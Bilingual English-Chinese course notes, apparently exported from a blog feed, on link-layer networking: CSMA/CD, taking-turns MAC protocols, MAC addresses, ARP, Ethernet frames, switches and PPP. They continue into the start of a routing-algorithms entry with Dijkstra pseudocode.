<strong>CSMA/CD (collision detection)</strong></p><ul><li><strong>collision detection (冲突检测)</strong>:<ul><li><strong>a transmitting node listens to</strong> the channel while it is  <strong>transmitting</strong></li><li>when it detects an interfering frame, <strong>stops and waits</strong> a  <strong>random amount of time</strong> before repeating <strong>sense-andtransmit-when-idle</strong> cycle</li></ul></li><li><strong>easy</strong> in wired LANs: measure signal strengths, compare  transmitted, received signals</li><li><strong>difficult</strong> in wireless LANs: received signal strength  overwhelmed by local transmission strength</li><li>CSMA/CD(带冲突检测的载波侦听多路访问): carrier sensing,  deferral as in CSMA<ul><li>collisions detected within short time</li><li>colliding transmissions aborted (立即终止), reducing channel  wastage (损耗)</li></ul></li><li>human analogy: the polite conversationalist (有礼貌且健谈的人)</li></ul><img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%821/net6.jpg" class=""><p>检测到碰撞将立即停止传输</p><p>adding collision detection to a multiple access protocol will help protocol performance by not transmitting a useless, damaged (by interference with a frame from another node) frame in its entirety, 不传输一个无用的、（由来自另一个结点的帧干扰）损坏的帧</p><ul><li><p>Random access protocols -III: Ethernet CSMA/CD algorithm</p><ul><li><p>Step 1. NIC receives  datagram from network  layer, creates frame</p></li><li><p>Step 2. If NIC senses  channel idle (no signal  energy entering the  adapter from the channel  for <strong>96 bit times</strong>), starts  frame transmission. If  NIC senses channel <strong>busy</strong>,  <strong>waits</strong> until channel <strong>idle</strong>  (<strong>plus 96 bit times</strong>), then  transmits（<strong>载波侦听！</strong>）</p></li><li><p>Step 3. If NIC transmits  entire frame without detecting another transmission, NIC is done  with frame !</p></li><li><p>Step 4. If NIC detects  another transmission while  transmitting, <strong>aborts and sends 48 bits jam signal</strong> ( 中止并发送拥堵信号)(冲突检测！)</p><p>(注：发送拥堵信号的目的是确保其他节点也能及时检测到冲突)</p></li><li><p>Step 5. <strong>After aborting</strong>, NIC enters <strong>binary (exponential)  backoff (二进制指数后退):</strong></p><p>→解决的问题→希望的时间间隔∶当碰撞结点数量较少时，时间间隔较短；当碰撞结点数量较大时，时间间隔较长</p><ul><li>after <strong>n th</strong> collision, NIC chooses <strong>K</strong> at random from {0,1,2,3  …, 2^n^ -1}, n&lt;=10. NIC waits <strong>K</strong>·512 bit times, returns to Step  2(发生n次冲突后，NIC从{0,1,2,3…, 2n -1}随机选择一个值赋给 K，并等待K·512 bit times，即K倍发送512bit数据所消耗的时间)</li><li>first collision: choose K from {0, 1}; delay is Kx512 bit  transmission times</li><li>after second collision: choose K from {0, 1, 2, 3}…</li><li>after ten or more collision: choose K from {0, 1, 2, 3, 4, … …  , 1023}</li><li>more collisions, longer backoff interval</li></ul></li><li><p>Random access protocols -III: Ethernet CSMA/CD efficiency</p><ul><li>d~prop~ = max propagation delay between two nodes  in LAN</li><li>d~trans~ = time to transmit a max-size frame</li><li>efficiency = 1/(1+5d~prop~/d~trans~)</li><li>efficiency goes to 1<ul><li>as <strong>d~prop~ goes to 0</strong>, <strong>colliding nodes will abort</strong> immediately  without wasting the channel</li><li>as <strong>d~trans~ goes to very large</strong>, frame <strong>hold on</strong> the channel for  long time, channel doing <strong>productive work</strong> most of time</li></ul></li><li><strong>better</strong> performance than ALOHA: and simple,  cheap, decentralized!</li></ul><p>(efficiency: the  long-run fraction of time during  which frames are  being transmitted  on the channel  without  collisions(many  nodes, all with  many frames to  send)</p></li></ul></li></ul><h3 id="5-3-3-Taking-Turns-Protocols-轮流协议">5.3.3 Taking-Turns Protocols,轮流协议</h3><p><code>two desirable properties of a multiple access protocol are</code></p><p><code>(1) when only one node is active, the active node has a throughput of R bps,and </code></p><p><code>(2)when M nodes are active, then each active node has a throughput of nearly R/M bps</code></p><p><code>The ALOHA and CSMA protocols have this first property but not the second</code></p><p>“Taking turns” MAC  protocols 轮流多路访问协议</p><ul><li><p>channel partitioning MAC protocols:</p><ul><li>share channel <strong>efficiently</strong> and <strong>fairly</strong> at high load</li><li><strong>inefficient</strong> at low load: delay in channel access, 1/N  bandwidth allocated even if only 1 active node!</li></ul></li><li><p>random access MAC protocols</p><ul><li><strong>efficient</strong> at <strong>low load</strong>: single node can fully utilize  channel</li><li>high load: collision overhead</li></ul><p>“taking turns” protocols look for best of both worlds!</p></li></ul><p>:one:“Taking turns” MAC  protocols-I: <strong>polling protocol(轮询协议)</strong></p><ul><li>原理：<strong>master</strong> node “invites” <strong>slave</strong> nodes to transmit in  turn</li><li>typically used with <strong>“dumb” slave devices</strong></li><li>eliminates (消除) the  collisions and empty slots</li><li>concerns:<ul><li>polling overhead</li><li>polling latency 轮询延迟</li><li>single point of failure  (master)</li></ul></li></ul><img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%821/net7.jpg" class=""><p>:two:“Taking turns” MAC protocols-II:  <strong>token passing protocols(令牌传输协议)</strong></p><ul><li>control token (令牌) passed from one node  to next <strong>sequentially</strong></li><li>token message: a <u>special-purpose frame</u>(特殊的帧) is  exchanged</li><li><strong>原理</strong>：node receives a token, holds onto it  if has frames to transmit, otherwise  forwards it to next node</li><li><strong>decentralized (no master node)</strong> and <strong>highly  efficient</strong></li><li>concerns:<ul><li>token overhead</li><li>latency</li><li>single point of failure ( a node crash or a  node neglects to release the token)</li></ul></li></ul><p>Summary of MAC  protocols</p><ul><li><p>channel partitioning, by time, frequency or code</p><ul><li>Time Division, Frequency Division, Code division</li></ul></li><li><p>random access (dynamic)</p><ul><li><p>S-ALOHA, ALOHA, CSMA, CSMA/CD</p></li><li><p>carrier sensing: easy in some technologies (wire), hard  in others (wireless)</p></li><li><p>CSMA/CD used in Ethernet</p></li><li><p>CSMA/CA used in 802.11 （带冲突避免的载波侦听多路访问）</p></li></ul></li><li><p>taking turns</p><ul><li>polling from central site, token passing</li><li>Bluetooth（蓝牙）, FDDI （光纤分布式数据接口）, token  ring (令牌环)</li></ul></li></ul><h1>5.4 LANs</h1><h3 id="5-4-1-MAC-Addresses">5.4.1 MAC Addresses</h3><ul><li><p>Recall: 32-bit IP address:</p><ul><li>network-layer address for <strong>interface</strong></li><li>used for layer 3 (network layer) <strong>forwarding</strong></li></ul></li><li><p>MAC (or LAN or physical) address:</p><ul><li><p>function: used ‘locally” to get frame from one interface to  another <strong>physically-connected</strong> interface (same network, in IP-addressing sense)</p></li><li><p>48 bit (<strong>6 bytes</strong>) MAC address (for most LANs) <strong>burned (固化)</strong>  <strong>in NIC ROM</strong>, also sometimes software settable, <strong>2^48^ possible</strong>  MAC address</p></li><li><p>e.g.: 1A-2F-BB-76-09-AD（16进制）</p></li><li><p>it is not a node(that is, host or router) that has a link-layer address but instead a node’s adapter that has a link-layer address</p></li></ul></li></ul><p><code>重要的是注意到链路层交换 机并不具有与它们的接口（这些接口是与主机和路由器相连的）相关联的链路层地址。这是因为链路层交换机的任务是在主机与路由器之间承载数据报;交换机透明地执行该项任务，这就是说，主机或路由器不必明确地将帧寻址到其间的交换机</code></p><ul><li>linklayer address：<strong>LAN address</strong> = <strong>physical address</strong> = <strong>MAC address</strong></li><li><strong>each adapter</strong> on LAN has <strong>unique</strong> LAN address (host, router, switch)</li></ul><img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%821/net8.jpg" class=""><ul><li>MAC address allocation administered by IEEE (Institute of  Electrical and Electronics Engineers,电气和电子工程师协会)</li><li>manufacturer buys portion of MAC address space (to assure  uniqueness (唯一性))</li><li>Analogy(类比):<ul><li>MAC address: like <strong>Social Security Number</strong> (no changes anywhere)</li><li>IP address: like <strong>postal address</strong></li></ul></li><li>MAC flat (扁平结构) (as opposed to a hierarchical structure)  address ➜ <strong>portability(便于携带)</strong><ul><li>can move adapter card from one LAN to another</li></ul></li><li>IP hierarchical (层次结构) address ➜ <strong>not portable</strong><ul><li>address depends on IP subnet to which node is attached</li></ul></li></ul><h3 id="5-4-2-Address-Resolution-Protocol-ARP">5.4.2 Address Resolution Protocol (ARP)</h3><ul><li>In a subnet, node want to send a  datagram, source must give its adapter  not only the IP datagram but also the  MAC address</li></ul><p><code>Question: how to determine interface’s MAC address,  knowing its IP address?</code></p><ul><li><p>ARP table: each IP node (host,  router) on LAN has table in memory</p><ul><li>IP/MAC address mappings for  some LAN nodes: &lt; <strong>IP address; MAC address; TTL</strong>&gt;</li><li>TTL (Time To Live): time after  which address mapping will be  forgotten (typically 20 min)</li></ul></li><li><p>ARP protocol: <strong>in same  subnet (在子网内)</strong></p><ul><li><p>A wants to send datagram to B</p><ul><li>but B’s MAC address not in A’s  ARP table</li></ul></li><li><p>A broadcasts ARP query packet,  containing B’s IP address</p><ul><li>dest MAC address = FF-FF-FFFF-FF-FF(目标IP：B的IP)</li><li>all nodes on LAN receive ARP query</li></ul></li><li><p>B receives ARP packet, replies  to A with its (B’s) MAC address</p><ul><li><p>frame sent to A’s MAC address  (unicast)</p><img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%821/net9.jpg" class=""></li></ul></li><li><p>A <strong>caches (saves) IP-to-MAC address pair</strong> in its ARP  table <strong>until information becomes old (times out)</strong></p><ul><li>soft state: information that times out (goes away)  unless refreshed</li></ul></li><li><p>ARP is <strong>“plug-and-play”即插即用:</strong></p><ul><li>nodes create their ARP tables without intervention (干 预) from net administrator</li></ul></li></ul></li><li><p>Addressing: routing to another  subnet (路由到其他子网)</p><p>walkthrough: send datagram from A to C via R</p><ul><li>focus on addressing – at IP (datagram) and MAC layer  (frame)</li><li>assume A knows C’s IP address</li><li>assume A knows IP address of first hop router, R (how?)</li><li>assume A knows R’s MAC address (how?)</li></ul></li></ul><img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%821/net10.jpg" class=""><ul><li>A creates IP datagram with IP source A, destination C</li><li>A creates link-layer frame with R’s MAC address as dest,  frame contains A-to-C IP datagram</li></ul><img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%821/net11.jpg" class=""><ul><li>frame sent from A to R</li><li>frame received at R, datagram removed, passed up to IP layer</li></ul><img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%821/net12.jpg" class=""><ul><li>R forwards datagram with IP source A, destination C  (<strong>forwarding table</strong>)</li><li>R creates link-layer frame with <strong>C’s MAC address (ARP)</strong> as  dest, frame contains A-to-C IP datagram</li></ul><img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%821/net13.jpg" class=""><h3 id="Ethernet">Ethernet</h3><p>“dominant” wired LAN technology (主流有线局域网技术):</p><ul><li>cheap $20 for NIC</li><li>reasons for the success<ul><li>first widely used LAN technology</li><li>simpler, cheaper than token ring (令牌环), FDDI(光纤分布式数据接口) and ATM</li><li>kept up with speed race: 10 Mbps – 10 Gbps</li></ul></li></ul><img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%821/net14.jpg" class=""><ul><li><p>Ethernet: physical  topology</p><img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%821/net15.jpg" class=""><ul><li><p><strong>bus (总线型拓扑结构)</strong>: popular through mid 90s</p><ul><li>a broadcast LAN, use CSMA/CD</li><li>all nodes in same collision domain (can collide with each other)</li></ul></li><li><p><strong>star(星型拓扑结构)</strong>: late 90s</p><ul><li>hub-based star topology, active hub (集线器) in center</li><li>hub: a physical-layer(物理层) device that acts on individual bits rather than  frames</li><li>boosts (放大) its energy strength and transmits the bit onto all the interfaces</li><li>also a broadcast LAN, use CSMA/CD</li><li>receives frames from two different interfaces at the same time, collision  occurs</li></ul></li><li><p>star (星型拓扑结构): prevails today (from early 2000s)</p><ul><li><p>switch (交换机) star topology  active switch in center</p></li><li><p>each “spoke” runs a (separate) Ethernet protocol (nodes  do not collide with each other), do not need CSMA/CD!</p></li><li><p>switch operates up through layer 2</p><img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%821/net16.jpg" class=""></li></ul></li></ul></li><li><p>Ethernet frame  structure</p><ul><li>sending adapter encapsulates <strong>IP datagram</strong> (or other  network layer protocol packet也可承载其他网络层协议 数据包) in <strong>Ethernet frame</strong></li></ul><img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%821/net17.jpg" class=""><ul><li>preamble(前同步码, 8 bytes):<ul><li>7 bytes with pattern 10101010 followed by 1 byte with  pattern 10101011</li><li>used to <strong>synchronize</strong> receiver, sender <strong>clock rates</strong></li><li><strong>addresses</strong>: <strong>6 byte</strong> source, destination MAC addresses<ul><li>if adapter receives frame with <strong>matching destination address</strong>,  or with broadcast address (e.g. ARP packet), it passes data in  frame to network layer protocol</li><li>otherwise, adapter <strong>discards</strong> frame</li></ul></li><li><strong>type(2 bytes)</strong>: indicates higher layer protocol (mostly IP but others possible, e.g., <strong>Novell IPX, AppleTalk</strong>)</li><li>Data(46-1,500bytes): <strong>&gt; 1500, fragment(分段)</strong> the  datagram; <strong>&lt;46</strong>, stuffed to <strong>fill it out</strong> (填充)</li><li><strong>CRC (4 bytes)</strong>: cyclic redundancy check at receiver<ul><li>error detected: frame is <strong>dropped</strong></li></ul></li></ul></li></ul></li><li><p>Ethernet: unreliable,  connectionless</p><ul><li>unreliable (不可靠): receiving NIC <strong>doesnt</strong> send <strong>acks</strong> or <strong>nacks</strong> to sending NIC<ul><li>if <strong>fails</strong> CRC check, <strong>discards</strong> the frame</li><li>data in dropped frames recovered only if initial sender uses  higher layer rdt (e.g., TCP), otherwise dropped data lost</li></ul></li><li><strong>connectionless(无连接)</strong>: no handshaking between sending  and receiving NICs (Recall: IP’s layer-3 datagram service,  UDP’s layer-4 service)</li><li>Ethernet’s MAC protocol: <strong>unslotted CSMA/CD wth binary  backoff</strong></li></ul></li></ul><h3 id="Hubs-集线器">Hubs (集线器)</h3><ul><li><strong>physical-layer (“dumb”) repeaters (转发器):</strong><ul><li>receives a signal on the input side, and regenerates the  signal on the output side</li></ul></li><li><strong>physical-layer Hubs (集线器):</strong><ul><li>bits coming <strong>in one link</strong> go out <strong>all other links</strong> at same rate</li><li>all nodes connected to hub can <strong>collide</strong> with one another</li><li><strong>no frame buffering</strong></li><li>no <strong>CSMA/CD</strong> at hub: host NICs detect collisions</li></ul></li></ul><p>Note:</p><p>Repeater -&gt; physical-layer (layer -1)</p><p>Hubs -&gt; physical-layer (layer -1)</p><p>Switch -&gt; link-layer (layer -2)</p><p>Router -&gt; network-layer (layer-3)</p><ul><li><p>Link-Layer switch</p><ul><li>link-layer device: takes an active role<ul><li>store, forward <strong>Ethernet frames</strong></li><li>examine incoming frame’s <strong>MAC address</strong>, <strong>selectively</strong>  <strong>forward frame</strong> to one-or-more outgoing links when  frame is to be forwarded on segment, uses <strong>CSMA/CD</strong> to access segment</li><li>output interfaces <strong>have buffers</strong></li></ul></li><li>transparent(透明性)<ul><li>hosts are <strong>unaware</strong> of presence of switches</li></ul></li><li><strong>plug-and-play device (self-learning 自学习)</strong><ul><li>switches <strong>do not need</strong> to be configured</li></ul></li></ul></li><li><p>Switch: multiple  simultaneous transmissions</p><ul><li><ul><li>hosts have dedicated, direct  connection to switch</li><li>switches <strong>buffer</strong> packets</li><li>Ethernet protocol used on  each incoming link, but <strong>no  collisions; full duplex (全双工)</strong><ul><li>each link is its own <strong>collision  domain (冲突域)</strong></li></ul></li><li><strong>switching</strong>: A-to-A’ and B-to-B’ can transmit simultaneously,  without collisions</li></ul><img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%821/net18.jpg" class=""><p>Note: Hubs 不能隔离冲突域(collision domain)和广播域(broadcast domain)</p><p>​           Switch：可隔离冲突域，不能隔离广播域</p><p>​           Router：可隔离冲突域和广播域</p></li></ul></li><li><p>Switch forwarding table</p><ul><li><p><strong>Filtering (过滤)</strong>: determines a frame  forward or dropped</p></li><li><p><strong>Forwarding(转发)</strong>: determines interfaces  should be directed and moved</p></li><li><p>Q: how does switch know A’ reachable via  interface 4, B’ reachable via interface 5?</p><p>A: each switch has a switch table(交换 表), each entry:</p><ul><li>(MAC address of host, interface to  reach host, time stamp)</li><li>looks like a routing table!</li></ul><p>Q: how are entries created,  maintained in switch table?  something like a routing protocol?</p><p>One important difference: switches  forward packets <strong>based on MAC  address</strong> rather than IP address</p><img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%821/net19.jpg" class=""></li><li><p>How filtering and forwarding work?</p></li><li><p>Suppose a frame with destination  address A arrives interface x</p><p>(1) no entry in the table, forwards  frame to <strong>all interface except x</strong> (广播该帧到除x外的所有接口)</p><p>(2) an entry in the table, associating A  with interface x, performs the  <strong>filtering function discarding the frame</strong>  (目标地址A对应的接口是x本身，丢弃帧)</p><p>(3) an entry in the table, associating A  with interface y≠x, <strong>forwards frame to interface y</strong> (目标地址A对应的接口不等 于x，转发帧)</p></li><li><p>Q: how the table configured? <strong>no need</strong>!</p></li></ul></li><li><p>Switch: self-learning  (自学习)</p><ul><li><p>switch learns which hosts  can be reached through  which interfaces</p><ul><li>when frame received,  switch “learns” location  of sender: incoming LAN  segment</li><li>records sender/location  pair in switch table</li><li><strong>plug-and-play devices (即插即用设备)</strong></li></ul><img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%821/net22-165486261625422.jpg" class=""></li></ul></li><li><p>filtering/forwardin</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">when frame received at <span class="hljs-keyword">switch</span>:<br>    <span class="hljs-number">1.</span> record incoming link, MAC address of sending host<br>    <span class="hljs-number">2.</span> index <span class="hljs-keyword">switch</span> table using MAC destination address<br>    <span class="hljs-number">3.</span> <span class="hljs-keyword">if</span> entry found <span class="hljs-keyword">for</span> destination<br>            then &#123;<br>            <span class="hljs-keyword">if</span> destination on segment <span class="hljs-keyword">from</span> which frame arrived<br>                then drop frame<br>            <span class="hljs-keyword">else</span> forward frame on <span class="hljs-keyword">interface</span> <span class="hljs-symbol">indicated</span> <span class="hljs-symbol">by</span> <span class="hljs-symbol">entry</span><br>            &#125;<br><span class="hljs-symbol">else</span> <span class="hljs-symbol">flood</span> /* <span class="hljs-symbol">forward</span> <span class="hljs-symbol">on</span> <span class="hljs-symbol">all</span> <span class="hljs-symbol">interfaces</span> <span class="hljs-symbol">except</span> <span class="hljs-symbol">arriving</span> <span class="hljs-symbol">interface</span> */<br><br></code></pre></td></tr></table></figure></li><li><p>Interconnecting switches</p><p>switches can be connected together</p></li></ul><img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%821/net23.jpg" class=""><p>Q: sending from A to G - how does S1 know to forward frame  destined to G via S4 and S3?</p><p>A: self learning! (works exactly the same as in single-switch  case!)</p><p>Suppose C sends frame to I, I responds to C</p><p>Q: show switch tables and packet forwarding in S1 , S2 ,  S3 , S4</p><img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%821/net24.jpg" class=""><ul><li><p>Switches vs. routers</p><ul><li><p>(1) both are store-andforward:</p><p><strong>routers</strong>: network-layer  devices (examine <strong>network-layer</strong> headers)</p><p><strong>switches</strong>: link-layer devices  (examine <strong>link-layer</strong> headers)</p></li><li><p>(2) both have forwarding  tables:</p><p>routers: <strong>routing table(路由表)</strong>, compute tables using  <strong>routing algorithms</strong>, forward  using <strong>IP addresses</strong></p><p>switches: <strong>switch table(交换表)</strong>, learn forwarding table  using <strong>flooding</strong>, forward using  <strong>MAC addresses</strong></p></li></ul></li></ul><img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%821/net25.jpg" class=""><h3 id="PPP-Design-Requirements-RFC-1557">PPP Design Requirements  [RFC 1557]</h3><ul><li><strong>packet framing</strong>: encapsulation of network-layer  datagram in data link frame   carry network layer data of any network layer protocol (not  just IP) at same time  ability to demultiplex upwards</li><li><strong>bit transparency (透明性)</strong>: must <strong>carry any bit</strong> pattern in  the data field</li><li><strong>error detection</strong> (no correction)</li><li><strong>connection liveness (活跃性)</strong>: detect, signal link failure  to network layer</li><li><strong>network layer address negotiation</strong>: endpoint can  learn/configure each other’s network address</li></ul><p>PPP non-requirements</p><ul><li>no error correction/recovery</li><li>no flow control</li><li>out of order delivery OK</li><li>no need to support multipoint links (e.g., polling)</li></ul><p>Error recovery, flow control, data re-ordering  all relegated (委托) to higher layers!</p><p>PPP Data Frame</p><ul><li><strong>Flag</strong>: delimiter 分隔符(framing), starting with 01111110</li><li><strong>Address</strong>: does nothing (only one option), in the future  possible use</li><li><strong>Control</strong>: does nothing; in the future possible multiple  control fields</li><li><strong>Protocol</strong>: upper layer protocol to which frame delivered  (eg, PPP-LCP, <strong>IP</strong>, IPCP, etc)</li><li><strong>info</strong>: upper layer data being carried (max. 1500 bytes)</li><li><strong>check</strong>: cyclic redundancy check for error detectio</li></ul><img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%821/net26.jpg" class=""><p>Byte Stuffing</p><ul><li><p>“data transparency” requirement: data field must be  allowed to include flag pattern &lt;01111110&gt;</p></li><li><p>Q: is received &lt;01111110&gt; data or flag?</p></li><li><p>Sender: adds (“stuffs”) extra &lt; 01111101&gt; (转义字符)  byte after each &lt; 01111110&gt; data byte</p></li><li><p>Receiver:</p><ul><li>single 01111110: flag byte</li><li>single 01111101+ 01111110: discard first byte, continue data  reception，后面跟的不是flag，而是数据</li><li>two 01111101 bytes in a row: discard first byte, continue data  reception，后面跟的不是转义字符，而是数据</li></ul><img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%821/net27.jpg" class=""></li></ul><p>PPP Data Control  Protocol</p><ul><li><p>Before exchanging networklayer data, data link peers  must</p><ul><li>configure PPP link (max.  frame length, authentication)</li><li>learn/configure network  layer information<ul><li>for IP: carry IP Control  Protocol (IPCP) msgs (protocol  field: 8021) to configure/learn  IP addresss</li></ul></li></ul><img src="/2024/02/20/%E7%AC%AC%E4%BA%94%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%821/net28.jpg" class=""></li></ul>]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第四章-网络层（四）</title>
    <link href="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%824/"/>
    <url>/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%824/</url>
    
    <content type="html"><![CDATA[<h1>4.5 Routing Algorithms</h1><ul><li>Typically a host is attached directly to one router, the <strong>default router</strong> for the host (also called <strong>the first-hop router</strong>，第一跳路由器 for the host)</li><li>c(x,x’) = cost of link (x,x’)</li></ul><p>:one:Routing algorithm  classification (分类一),global or decentralized information?</p><ul><li>global (全局式路由算法):<ul><li>all routers have complete topology(拓扑结构), link cost info</li><li>referred to as <strong>“link state” algorithms(LS, 链路状态算法)</strong></li></ul></li><li>decentralized (分散式路由算法)<ul><li>router only knows <u>physically-connected neighbors</u>, <u>link costs to neighbors</u></li><li><strong>iterative</strong>(迭代) process of computation, exchange of info with  neighbors</li><li>referred to as <strong>“distance vector” algorithms (DV, 距离向量算法)</strong></li></ul></li></ul><p>:two:Routing algorithm  classification (分类二),static or dynamic?</p><ul><li>static (静态路由算法):<ul><li>routes change slowly over time</li><li>human manually(人工地，手动地) edit forwarding table</li></ul></li><li>dynamic (动态路由算法):<ul><li>routes change more quickly</li><li>periodic update</li><li>or in response to topology or link cost changes</li><li>more susceptible(易受影响的) to problems such as <strong>routing loops</strong> and <strong>oscillation</strong>(路由选择循环和震荡) in routes</li></ul></li></ul><p>:three:Routing algorithm  classification (分类三),:load-sensitive or load-insensitive?</p><ul><li>load-sensitive algorithm (负载敏感算法):<ul><li><strong>link costs</strong> vary dynamically to reflect the current <strong>level  of congestion</strong></li><li>a high cost is associated with a link that is currently  congested</li><li>routing algorithm will tend to choose routes around  such a congested link (在拥塞的链路上选择合适的路径)</li><li>e.g. ARPAnet</li></ul></li><li>load-insensitive (负载不敏感&lt;迟钝&gt;路由算法)<ul><li><strong>link’s cost does not</strong> explicitly reflect its current (or  recent past) <strong>level of congestion</strong></li><li>e.g. RIP, OSPF, and BGP</li><li>Today’s Internet routing algorithms(such as RIP, OSPF, and BGP) are load-insensitive, as a link’s cost does not explicitly reflect its current (or recent past) level of congestion</li></ul></li></ul><h3 id="4-5-1-The-Link-State-LS-Routing-Algorithm，链路状态路由选择算法">4.5.1 The Link-State(LS)Routing Algorithm，链路状态路由选择算法</h3><ul><li>In LS routing algorithm, the network <strong>topology and  all link costs</strong> are known (网络拓扑和链路代价已知)</li><li>实现途径：accomplished by having <strong>each node</strong>  broadcast link-state packets to all other nodes in  the network <strong>link-state broadcast</strong> algorithm  [Section 4.7]<ul><li>each link-state packet containing the <strong>identities</strong> and  <strong>costs of its attached links</strong></li><li>finally, all nodes have an <strong>identical and complete view</strong>  of the network!</li></ul></li><li><strong>link-state routing algorithm</strong> is known as <strong>Dijkstra’s algorithm (迪杰斯特拉算法)</strong>, named after its inventor</li></ul><p>:small_blue_diamond:Dijkstra’s algorithm</p><ul><li><p>net topology, link costs known to all nodes</p><ul><li>accomplished via <strong>“link state broadcast”</strong></li><li>all nodes have <strong>same</strong> info</li></ul></li><li><p>can computes least cost paths from <strong>one node  (‘source”) to all other nodes</strong></p><ul><li>gives <strong>forwarding table</strong> for that node</li></ul></li><li><p><strong>iterative</strong>(迭代算法): after <strong>k</strong> iterations, know least  cost path to <strong>k</strong> dest.’s</p></li><li><p>notation(数学符号):</p><ul><li>c(x, y): link cost from node x to y;  = ∞ if not direct  neighbors (从节点x到y的链路代价，如果不相邻则值为无穷)</li><li>D(v): current value of least cost of path from source to  dest. v (从<u>原点</u>到<u>目标节点v</u>的<u>最小代价路径</u>的值)</li><li>p(v): predecessor node (neighbor of v) along current leastcost path from source to v (从源点到目标节点v的最小代价路 径中，节点v的前继节点)</li><li>N‘: set of nodes whose least cost path definitively known (已经确定在最小代价路径中的节点集合)</li></ul></li></ul><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>Initialization(初始化):<br><span class="hljs-symbol">2 </span>N‘ = &#123;u&#125;        /*初始时仅有源节点*/<br><span class="hljs-symbol">3 </span><span class="hljs-keyword">for</span> all nodes v /*注意：此处节点u为例子中存在的节点，v, w均为变量*/<br><span class="hljs-symbol">4 </span><span class="hljs-keyword">if</span> v adjacent (临近) <span class="hljs-keyword">to</span> u <br><span class="hljs-symbol">5 </span><span class="hljs-keyword">then</span> D(v) = c(u,v) /*如果节点v与节点u为邻居， D(v) = c(u,v) */<br><span class="hljs-symbol">6 </span><span class="hljs-keyword">else</span> D(v) = ∞          /*否则D(v) = ∞ */<br><span class="hljs-symbol">7 </span><br><span class="hljs-symbol">8 </span>Loop<br><span class="hljs-symbol">9 </span>find w <span class="hljs-keyword">not</span> in N‘ such that D(w) is a minimum   /*某一个节点w*/<br><span class="hljs-symbol">10 </span>add w <span class="hljs-keyword">to</span> N‘ /*从N’之外的节点中选择一个节点w, D(w)的值最小，添加到N’ */<br><span class="hljs-symbol">11 </span>update D(v) <span class="hljs-keyword">for</span> all v adjacent <span class="hljs-keyword">to</span> w <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> in N<span class="hljs-comment">&#x27;: /*针对w的所有邻居节点重新计算D(v) ，这些节点是集合N’之外的节点*/</span><br><span class="hljs-symbol">12 </span>D(v) = min( D(v), D(w) + c(w,v) )  /* <span class="hljs-keyword">new</span> cost <span class="hljs-keyword">to</span> v is either old cost <span class="hljs-keyword">to</span> v <span class="hljs-keyword">or</span> known shortest path cost <span class="hljs-keyword">to</span> w plus cost from w <span class="hljs-keyword">to</span> v */ <br><span class="hljs-symbol">13 </span>until all nodes in N‘ /*所有节点加入集合N’ ，算法结束*/<br></code></pre></td></tr></table></figure><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%824/4.4.jpg" 